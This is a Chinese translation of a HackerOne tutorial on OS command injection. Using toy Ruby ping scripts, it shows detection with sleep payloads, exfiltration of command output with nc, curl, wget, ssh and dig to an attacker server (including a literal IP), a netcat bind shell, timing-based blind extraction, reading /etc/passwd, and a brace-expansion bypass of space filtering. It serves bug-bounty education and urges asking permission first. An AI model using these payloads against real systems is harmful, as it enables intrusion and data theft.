# 【安全科普】Web安全之浅析命令注入

阅读量 **190773**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-08-11 13:47:54

 **x**

##### 译文声明

本文是翻译文章，文章来源：hackerone.com

原文地址：<https://www.hackerone.com/blog/how-to-command-injections>

译文仅供参考，具体内容表达以及含义原文为准。

译者：[LeagerL](http://bobao.360.cn/member/contribute?uid=2942089324)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

  

命令注入是指攻击者可以能够控制操作系统上执行的命令的一类漏洞。 这篇文章将会讨论它的影响，包括如何测试它 ，绕过补丁和注意事项。

在命令注入之前，先要深入了解 的是:命令注入与远程代码执行(RCE)不一样。它们的区别是 ，通过RCE，执行的是代码 ，而在命令注入的时
，执行的是一个(OS)命令。这可能只是一个微小的影响差异，但关键的区别在于如何找到并利用它们。

  

**设置**

我们首先编写两个简单的Ruby脚本，通过本地运行脚本来学习如何发现并利用命令注入漏洞 。我使用Ruby 2.3.3p222。下面是ping.rb。

    
    
    puts `ping -c 4 #{ARGV[0]}`

该脚本将会，防止异意ping作为参数传递给脚本的服务器。 然后它将在屏幕上返回命令输出。示例输出如下。  

    
    
    $ ruby ping.rb '8.8.8.8'
    PING 8.8.8.8 (8.8.8.8): 56 data bytes
    64 bytes from 8.8.8.8: icmp_seq=0 ttl=46 time=23.653 ms
    64 bytes from 8.8.8.8: icmp_seq=1 ttl=46 time=9.111 ms
    64 bytes from 8.8.8.8: icmp_seq=2 ttl=46 time=8.571 ms
    64 bytes from 8.8.8.8: icmp_seq=3 ttl=46 time=20.565 ms
    --- 8.8.8.8 ping statistics ---    4 packets transmitted, 4 packets received, 0.0% packet loss
    round-trip min/avg/max/stddev = 8.571/15.475/23.653/6.726 ms

如上所示，它执行ping -c 4 8.8.8.8并在屏幕上显示输出。这是另一个脚本：server-online.rb。

    
    
    puts `ping -c 4 #{ARGV[0]}`.include?('bytes from') ? 'yes' : 'no'

该脚本将根据ICMP响应（ping）来确定服务器是否处于联机状态。如果它响应ping请求，将在屏幕上显示是。如果没有，将显示否。命令的输出不会返回给用户。示例输出如下。

    
    
    $ ruby server-on.rb '8.8.8.8'
    yes
    $ ruby server-on.rb '8.8.8.7'
    No

**测试**

检测一级命令注入漏洞的最佳方法之一是尝试执行sleep命令，并确定执行时间是否增加。首先，我们为ping.rb脚本建立时间基线 :

    
    
    $ time ruby ping.rb '8.8.8.8'
    PING 8.8.8.8 (8.8.8.8): 56 data bytes
    ...
    0.09s user 0.04s system 4% cpu 3.176 total

注意，执行脚本大约需要3秒。我们通过注入sleep命令观察脚本是否容易受到命令注入攻击。

    
    
    $ time ruby ping.rb '8.8.8.8 && sleep 5'
    PING 8.8.8.8 (8.8.8.8): 56 data bytes
    ...
    0.10s user 0.04s system 1% cpu 8.182 total

该脚本现在将执行命令ping -c 4 8.8.8.8 && sleep
5。再次注意执行时间：它从〜3秒跳到〜8秒，这增加了5秒。互联网上仍然可能会出现意想不到的延迟，所以重复注入和设定较长的时间是很重要的，以确保它不是假阳性。

我们来观察 server-online.rb脚本是否也是易受攻击的。

    
    
    $ time ruby server-online.rb '8.8.8.8'
    yes
    0.10s user 0.04s system 4% cpu 3.174 total
    $ time ruby server-online.rb '8.8.8.8 && sleep 5'
    yes
    0.10s user 0.04s system 1% cpu 8.203 total

同样，基线显示执行一个正常的请求大约需要3秒。在命令中添加&sleep5会增加到8秒的时间。

根据执行的命令，可以注入不同的sleep命令。以下是一些可以尝试的有效payload(它们都是有效的):

    
    
    time ruby ping.rb '8.8.8.8`sleep 5`'

当一个命令行被解析时，反引号之间的所有内容都将首先执行。执行echo
`ls`将首先执行ls并捕获其输出。然后会将输出传递给echo，该输出将在屏幕上显示ls的输出，这被称为命令替换。由于反引号间的命令优先执行，
，所以之后的命令无关紧要。下面是一个带有注入有效payload及其结果的命令表。注入的有效payload被标记为绿色。

    
    
    time ruby ping.rb '8.8.8.8$(sleep 5)'

这是命令替换的另一种方式 。当反引号被过滤或编码时，这可能很有效。当使用命令替换来查找命令注入时，请确保对两种方式 进行测试，来替换掉有效payload
(见上表中的最后一个例子)。

    
    
    time ruby ping.rb '8.8.8.8; sleep 5'

命令按照顺序（从左到右）执行，并且可以用分号分隔。当序列中的一个命令执行失败时，不会停止执行其他命令。下面是一个带有注入有效payload及其结果的命令表。
注入的有效payload用绿色标记。

    
    
    time ruby ping.rb '8.8.8.8 | sleep 5'

命令输出可以按顺序将命令通过管道输出到其他命令。当执行cat/etc/passwd grep root
时，它将捕获cat/etc/passw命令的输出并将其传递给grep root，然后将显示与root
匹配的行。当第一个命令失败时，它仍然执行第二个命令。下面是一个带有注入有效payload及其结果的命令表。注入的有效payload用绿色标记。

  

**利用**

利用漏洞时需要判断是通常的注入还是盲注 。两者之间的区别在于盲注 不会返回命令的输出。通常命令注入会将 返回响应中
执行命令(s)的输出。sleep指令通常是一种很好的概念证明 。但是如果需要更多的信息
，可以执行id、hostname,或whoami，并使用输出查看结果。服务器的hostname有助于确定有多少服务器受到影响，并帮助供应商更快地获得反馈。

重点：大多数公司都不喜欢你窥探他们的系统。利用该漏洞进行其他任务之前，请向该公司申请许可。在几乎所有的情况下，执行去掉无害的命令，如sleep、id、hostname,或whoami，就足以证明该公司存在该漏洞。

  

**利用命令注入**

这通常很简单：任何注入的命令的输出都将返回给用户：

    
    
    $ ruby ping.rb '8.8.8.8 && whoami'
    PING 8.8.8.8 (8.8.8.8): 56 data bytes
    64 bytes from 8.8.8.8: icmp_seq=0 ttl=46 time=9.008 ms
    64 bytes from 8.8.8.8: icmp_seq=1 ttl=46 time=8.572 ms
    64 bytes from 8.8.8.8: icmp_seq=2 ttl=46 time=9.309 ms
    64 bytes from 8.8.8.8: icmp_seq=3 ttl=46 time=9.005 ms
    --- 8.8.8.8 ping statistics ---    4 packets transmitted, 4 packets received, 0.0% packet loss
    round-trip min/avg/max/stddev = 8.572/8.973/9.309/0.263 ms
    jobert

红色部分显示了ping命令的输出。绿色文本是whoami命令的输出。这就是你的POC。再次强调，要坚持使用无害的命令。

  

**利用命令盲注**

使用盲注命令，输出不会返回给用户，所以应该找到其他方法来提取输出。最直接的技术是将输出回传到您的服务器。为了模拟这一点，请在服务器上运行nc -l -n
-vv -p 80 -k，并允许防火墙中端口80上的入站连接。

设置好监听器后，使用nc，curl，wget，telnet或任何其他向互联网发送数据的工具，将输出发送到您的服务器：

    
    
    $ ruby server-online.rb '8.8.8.8 && hostname | nc IP 80'
    yes

然后观察一个连接到服务器的连接，该连接显示hostname命令的输出:

    
    
    $ nc -l -n -vv -p 80 -k
    Listening on [0.0.0.0] (family 0, port 81)
    Connection from [1.2.3.4] port 80 [tcp/*] accepted (family 2, sport 64225)
    hacker.local

在上面的示例中，nc用于将命令的输出发送到您的服务器。然而，nc可能会被删除或无法执行。为了防止掉进坑中
，有几个简单的有效payload来确定一个命令是否存在。如果命令中的任何一个命令增加了5秒的时间，就知道这个命令是存在的。

    
    
    curl -h && sleep 5
    wget -h && sleep 5
    ssh -V && sleep 5
    telnet && sleep 5

确定命令时，可以使用上面中的任意一个命令将命令的输出发送到服务器，如下所示：

    
    
    whoami | curl http://your-server -d @-    wget http://your-server/$(whoami)
    export C=whoami | ssh user@your-server (setup the user account on your-server to authenticate without a password and log every command being executed)

即使server-online.rb脚本不输出hostname命令的结果，也可以将该输出发送到远程服务器，并由攻击者获取。有时候
，出站TCP和UDP无法使用。在这种情况下我们只需要一点处理就可以继续 。

为了拿到结果 ，我们必须基于可以更改的内容来猜测输出。在这种情况下，可以使用sleep命令来增加执行时间。这可以用于检测是否执行
。这里的技巧是将命令的结果传递给sleep命令。这里有一个例子：sleep $（hostname | cut -c 1 | tr a 5）。
下面来分析一下。

它正在执行hostname命令。 我们假设它返回hacker.local。

它会把该输出传递给cut -c 1.这将取代hacker.local的第一个字符，这是字符h。

它将其传递给tr a 5，它将在切割命令（h）的输出中用一个5代替字符a。

然后将tr命令的输出传递给sleep命令，导致执行sleep h。
这将立即出现错误，因为sleep只能作为第一个参数。目标是用tr命令迭代字符。一旦执行sleep $（hostname | cut -c 1 | tr h
5），命令将需要5秒钟的时间才能执行。这就是如何确定第一个字符是一个h的方法。

一旦你猜到一个字符，就把你传递给cut-c命令的次数增加，然后重复。

下面是一个使用命令来确定输出的表:

要确定需要猜测多少个字符:将hostname的输出传递到wc-c，并将其传递给sleep命令。hacker.local是12个字符。hostname命令返回hostname和新行，因此wc-c将返回13。我们建立了正常的脚本，脚本需要3秒才能完成。

    
    
    $ time ruby server-online.rb '8.8.8.8 && sleep $(hostname | wc -c)'
    yes
    0.10s user 0.04s system 0% cpu 16.188 total

上面的有效payload
表明脚本现在需要16秒才能完成，这意味着hostname的输出是12个字符:16-3(基线)-1(新行)=12个字符。当在web服务器上执行这个有效payload时，输出可能会发生变化:当不同的服务器处理请求时，hostname的长度可能会发生变化。

上述技术适用于较小的输出，但读取文件 可能需要很长时间。 以下一些方法可能会具有很大的侵犯性，所以一定要确保公司批准 ，并让你使用更具侵略性的方法。
在出站连接无法使用 并且使用时间法会消耗大量时间的情况下，这里还有一些其他的技巧（在CTF期间有用）：

在服务器上运行端口扫描，并基于已暴露的服务去确定一种提取输出的方法。

FTP：尝试将文件写入一个目录，可以从该目录中下载文件。

SSH:尝试将命令的输出写到MOTD标志，然后简单地将SSH连接到服务器。

Web:尝试将命令的输出写到公共目录中的文件(/var/www/)。

在一个可以从外部到达的端口上生成一个shell(只在定制的netcat中可用):nc-l-n-vv-p 80-e/bin/bash(unix)或nc-l-vv-cmd-cmd。exe(windows)。

使用dig或nslookup进行DNS查询以将输出发送到端口53（UDP）：dig`hostname` @ your-server或nslookup`hostname` your-server。可以使用服务器上的nc -l -n -v–p-53 -u -k捕获输出。
这可能会有用 ，因为通常允许出站DNS流量。 看看这条推特如何回传文件内容。

在ping服务器以回传数据时，请更改ICMP数据包大小。 tcpdump可用于捕获数据。 看看这个推文如何做到这一点。

还有很多其他的方法，但这常常取决于服务器给你的配置 。上面所示的技术在利用命令注入漏洞时是最常见的。关键是使用所需要的内容来提取输出！

  

**绕过补丁**

有时，服务器已经采取了一些防范 ，这可能导致上述方法不起作用。我所知道有一种缓解 方法是对有效payload
的空格进行限制。即有一种叫做“括号扩展”的技术可以用来创建没有空格的有效payload。下面是ping-2.rb，它是ping.rb的第二个版本。在将用户输入传递给命令之前，它会从输入中删除空格。

    
    
    puts `ping -c 4 #{ARGV[0].gsub(/s+?/,'')}`

当将8.8.8.8&&sleep 5作为参数传递时，它将执行ping-c 4 8.8.8.8&&sleep 5，这将导致一个错误显示 命令sleep
5没有被发现。有一种简单的方法可以使用括号扩展:

    
    
    $ time ruby ping-2.rb '8.8.8.8;{sleep,5}'
    ...
    0.10s user 0.04s system 1% cpu 8.182 total

下面是一个有效payload ，它将命令的输出发送到外部服务器，而不使用空格:

    
    
    $ ruby ping.rb '8.8.8.8;hostname|{nc,192.241.233.143,81}'
    PING 8.8.8.8 (8.8.8.8): 56 data bytes
    ...
    Or to read /etc/passwd:
    $ ruby ping.rb '8.8.8.8;{cat,/etc/passwd}'
    PING 8.8.8.8 (8.8.8.8): 56 data bytes
    64 bytes from 8.8.8.8: icmp_seq=0 ttl=46 time=9.215 ms
    64 bytes from 8.8.8.8: icmp_seq=1 ttl=46 time=10.194 ms
    64 bytes from 8.8.8.8: icmp_seq=2 ttl=46 time=10.171 ms
    64 bytes from 8.8.8.8: icmp_seq=3 ttl=46 time=8.615 ms
    --- 8.8.8.8 ping statistics ---    4 packets transmitted, 4 packets received, 0.0% packet loss
    round-trip min/avg/max/stddev = 8.615/9.549/10.194/0.668 ms
    ##
    # User Database
    #
    # Note that this file is consulted directly only when the system is running
    # in single-user mode. At other times this information is provided by
    # Open Directory.
    ...

开发人员必须关注由用户输入整合的命令，并做好防范 。开发人员采用不同的方法来防范命令注入 ，你可以试着探索一下他们是怎么做的 。

本文翻译自hackerone.com [原文链接](https://www.hackerone.com/blog/how-to-command-injections)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **LeagerL** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86604](/post/id/86604)

安全客 - 有思想的安全新媒体

本文转载自: [hackerone.com](https://www.hackerone.com/blog/how-to-command-injections)

如若转载,请注明出处： <https://www.hackerone.com/blog/how-to-command-injections>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __1赞

 __收藏

![](https://p0.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg) LeagerL

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

